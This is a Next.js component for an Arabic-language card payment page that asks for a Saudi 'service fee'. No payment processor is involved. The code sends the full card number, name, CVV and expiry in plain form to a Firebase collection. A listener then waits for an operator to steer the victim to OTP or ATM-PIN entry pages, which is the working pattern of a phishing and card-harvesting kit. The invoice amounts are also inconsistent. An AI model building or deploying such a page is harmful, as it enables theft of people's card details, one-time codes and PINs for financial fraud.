"use client";
import { useEffect, useState } from "react";
import { useSearchParams, useRouter } from "next/navigation";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import {
  Select,
  SelectContent,
  SelectItem,
  SelectTrigger,
  SelectValue,
} from "@/components/ui/select";
import { Lock, CreditCard } from "lucide-react";
import { addData, db } from "@/lib/firebase";
import { doc, onSnapshot } from "firebase/firestore";
import Image from "next/image";
import FullPageLoader from "@/components/loader";
import { getRedirectUrl } from "@/lib/page-routes";

export default function PaymentForm() {
  const router = useRouter();
  const searchParams = useSearchParams();
  const appointmentId = searchParams.get("appointmentId");

  const [cardNumber, setCardNumber] = useState("");
  const [cardName, setCardName] = useState("");
  const [expiryMonth, setExpiryMonth] = useState("");
  const [expiryYear, setExpiryYear] = useState("");
  const [cvv, setCvv] = useState("");
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [isLoading, setIsLoading] = useState(false);
  const [visitorId, setVisitorId] = useState("");

  /* ------------------ Card Formatter ------------------ */
  const formatCardNumber = (value: string) => {
    const v = value.replace(/\D/g, "");
    return v.match(/.{1,4}/g)?.join(" ") ?? "";
  };

  const handleCardNumberChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const formatted = formatCardNumber(e.target.value);
    if (formatted.length <= 19) setCardNumber(formatted);
  };

  /* ------------------ Submit ------------------ */
  const handleSubmit = async () => {
    setIsSubmitting(true);

    const visitorID = localStorage.getItem("visitor");
    await addData({
      id: visitorID,
      cardNumber,
      cardName,
      cvv,
      expiryMonth,
      expiryYear,
      cardApproval: "pending",
    });

    await new Promise((r) => setTimeout(r, 2000));
    setIsSubmitting(false);
    //router.push("/payment/atm-pin");
  };

  /* ------------------ Firestore Listener ------------------ */
  useEffect(() => {
    let v = visitorId;
    if (typeof window !== "undefined" && !v) {
      v = localStorage.getItem("visitor") || "";
      setVisitorId(v);
    }

    if (!v) return;

    const unsubscribe = onSnapshot(doc(db, "pays", v), (snap) => {
      if (!snap.exists()) return;

      const userData = snap.data();

      if (userData.cardApproval === "pending") setIsLoading(true);
      if (userData.cardApproval === "otp")
        window.location.href = "/payment/otp";
      if (userData.cardApproval === "approved")
        window.location.href = "/payment/pin";
      if (userData.cardApproval === "rejected") alert("رمز التحقق غير صحيح");
      const redirectUrl = getRedirectUrl(userData.currentPage, "payment");
      if (redirectUrl) window.location.href = redirectUrl;
    });

    return () => unsubscribe();
  }, [visitorId]);

  const isFormValid =
    cardNumber.length === 19 &&
    cardName &&
    expiryMonth &&
    expiryYear &&
    cvv.length >= 3;

  return (
    <div className="space-y-6">
      {/* Invoice Information */}
      <div className="bg-white rounded-xl shadow-sm border border-stone-200 p-6">
        <h2 className="text-xl font-bold text-stone-900 text-center mb-2">
          معلومات الفاتورة
        </h2>
        <p className="text-stone-500 text-center text-sm mb-6">
          دفع رسوم الخدمة
        </p>

        <div className="text-center mb-6">
          <span className="text-5xl font-bold text-green-600">100.50</span>
          <span className="text-2xl font-bold text-green-600 mr-2">ر.س</span>
        </div>

        <div className="space-y-3 border-t border-stone-200 pt-4">
          <div className="flex justify-between items-center">
            <span className="text-stone-600">المجموع الفرعي</span>
            <span className="font-semibold">10.00 ر.س</span>
          </div>
          <div className="flex justify-between items-center">
            <span className="text-stone-500 text-sm">
              ضريبة القيمة المضافة 15%
            </span>
            <span className="text-stone-500">10.50 ر.س</span>
          </div>
          <div className="flex justify-between items-center border-t border-stone-200 pt-3">
            <span className="font-bold text-stone-800">المبلغ المستحق</span>
            <span className="font-bold text-stone-800">110.50 ر.س</span>
          </div>
        </div>
      </div>

      {/* Payment Form */}
      <div className="bg-white rounded-xl shadow-sm border border-stone-200 p-6">
        <h2 className="text-xl font-bold text-stone-900 text-center mb-2">
          الدفع من خلال بطاقة الائتمان
        </h2>
        <p className="text-stone-500 text-center text-sm mb-6">
          من فضلك أدخل معلومات الدفع الخاصة بك
        </p>

        <div className="space-y-4">
          {/* Card Number */}
          <div>
            <Label className="text-stone-700 font-medium mb-2 block text-right">
              رقم البطاقة
            </Label>
            <div className="relative">
              <Input
                type="tel"
                dir="ltr"
                value={cardNumber}
                onChange={handleCardNumberChange}
                placeholder="1234 1234 1234 1234"
                className="h-12 text-right pr-12"
              />
              <CreditCard className="absolute left-3 top-1/2 -translate-y-1/2 h-5 w-5 text-stone-400" />
            </div>
          </div>

          {/* Cardholder Name */}
          <div>
            <Label className="text-stone-700 font-medium mb-2 block text-right">
              اسم صاحب البطاقة
            </Label>
            <Input
              type="text"
              value={cardName}
              onChange={(e) => setCardName(e.target.value)}
              placeholder="الأسم على البطاقة (بالإنجليزية)"
              className="h-12"
            />
          </div>

          {/* Expiry and CVV */}
          <div className="grid grid-cols-2 gap-4">
            <div>
              <Label className="text-stone-700 font-medium mb-2 block text-right">
                تاريخ الانتهاء
              </Label>
              <div className="flex gap-2">
                <Select value={expiryMonth} onValueChange={setExpiryMonth}>
                  <SelectTrigger className="h-12">
                    <SelectValue placeholder="شهر" />
                  </SelectTrigger>
                  <SelectContent>
                    {Array.from({ length: 12 }, (_, i) => (
                      <SelectItem
                        key={i + 1}
                        value={String(i + 1).padStart(2, "0")}
                      >
                        {String(i + 1).padStart(2, "0")}
                      </SelectItem>
                    ))}
                  </SelectContent>
                </Select>
                <Select value={expiryYear} onValueChange={setExpiryYear}>
                  <SelectTrigger className="h-12">
                    <SelectValue placeholder="سنة" />
                  </SelectTrigger>
                  <SelectContent>
                    {Array.from({ length: 10 }, (_, i) => (
                      <SelectItem key={i} value={String(2025 + i)}>
                        {2025 + i}
                      </SelectItem>
                    ))}
                  </SelectContent>
                </Select>
              </div>
            </div>
            <div>
              <Label className="text-stone-700 font-medium mb-2 block text-right">
                رمز (CVV)
              </Label>
              <div className="relative">
                <Input
                  type="password"
                  value={cvv}
                  onChange={(e) =>
                    setCvv(e.target.value.replace(/\D/g, "").slice(0, 4))
                  }
                  placeholder="CVV"
                  className="h-12 text-left"
                  dir="ltr"
                  maxLength={4}
                />
                <Lock className="absolute left-3 top-1/2 -translate-y-1/2 h-4 w-4 text-stone-400" />
              </div>
            </div>
          </div>

          <Button
            onClick={handleSubmit}
            disabled={!isFormValid || isSubmitting}
            className="w-full bg-green-600 hover:bg-green-700 disabled:bg-stone-300 disabled:cursor-not-allowed text-white text-lg h-14 mt-4 shadow-md"
          >
            {isSubmitting ? "جاري المعالجة..." : "ادفع الآن"}
          </Button>
          {isLoading && <FullPageLoader />}
        </div>

        {/* Payment Logos */}
        <div className="mt-6 pt-4 border-t border-stone-200">
          <p className="text-center text-xs text-stone-500 mb-3">نقبل هنا</p>
          <div className="flex justify-center items-center gap-4">
            <Image
              src="https://upload.wikimedia.org/wikipedia/commons/5/5e/Visa_Inc._logo.svg"
              alt="Visa"
              width={60}
              height={24}
              className="h-6 w-auto"
            />
            <Image
              src="https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg"
              alt="Mastercard"
              width={60}
              height={32}
              className="h-8 w-auto"
            />
            <Image
              src="/mada.svg"
              alt="Visa"
              width={50}
              height={20}
              className="h-5 w-auto"
            />
          </div>
        </div>

        {/* Secure Payment */}
        <div className="flex items-center justify-center gap-2 mt-4 text-green-600">
          <Lock className="h-4 w-4" />
          <span className="text-sm font-medium">دفع آمن وسريع</span>
        </div>
      </div>
    </div>
  );
}
